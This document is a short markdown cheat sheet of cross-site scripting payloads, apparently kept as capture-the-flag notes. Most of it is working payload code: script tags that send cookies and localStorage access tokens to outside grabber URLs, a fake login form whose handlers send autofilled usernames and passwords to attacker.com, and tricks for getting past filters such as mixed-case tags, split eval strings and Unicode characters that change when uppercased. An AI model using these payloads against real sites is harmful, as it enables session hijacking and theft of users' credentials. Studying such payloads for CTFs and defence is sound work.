# XSS (Cross-Site Scripting)
> XSS is a form of injection that enables attackers to inject client-side scripts into web pages viewed by other users.

## OG exploit (cookie grabbing / local storage)
By far the most common type of XSS. Involves loading an external link controlled by attacker with cookie appended as a query, may be a JWT, flag or some other secret.

```
<script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>
<script>document.location='http://localhost/XSS/grabber.php?c='+localStorage.getItem('access_token')</script>
<script>new Image().src="http://localhost/cookie.php?c="+document.cookie;</script>
<script>new Image().src="http://localhost/cookie.php?c="+localStorage.getItem('access_token');</script>
<script>fetch('https://webhook.site?'+document.cookie)</script>
```

## Password autofill
We can exploit password managers that automatically fill in HTML input that match `username` and `password` types.

```
<form class="login-form" method="GET" action="/login"> 
	<input type="username" name="username" onchange="fetch('https://attacker.com?username='+this.value)">
	<input type="password" name="password" onchange="fetch('https://attacker.com?password='+this.value)"> 
</form>
```

## Filter evasion!!

### Bypass < & >
Using these special characters: `＜` and `＞` or other similar characters. If you're lucky, the backend will accidentally convert these to actual angle brackets

### Bypass blacklisted js functions
```js
eval('ale'+'rt(1)')
```

### Bypass tag blacklist (no `<script>`)
```
<script x>
<script x>alert(1)<script y>
```

```
<sCrIpt> alert(1) </sCrIpt>
```

## Input is being uppercased
You can make use of HTML entity encodings to bypass the uppercasing. Refer to: `/CTF/tools/Web/html-entity-encoder.py`, which converts your input into HTML entities and URL encodes it.

In addition, you can also take advantage of this. Certain characters (like ß and ﬃ) count as a single character, but become multiple characters when uppercased (SS and FFI). This is useful in very limited contexts, such as when the length of the initial string is used to iterate through the modifed (uppercased) string later on. By spamming the special characters at the start, you can "push" your XSS payload back, so any filters in place doesn't detect/remove your payload. Refer to: [blazing fast](https://smitop.com/p/dctf22-blazingfast/) (TODO: find characters that do the same for lowercasing)


## Relevant tools
`/CTF/tools/Web/XSS/xssstrike`
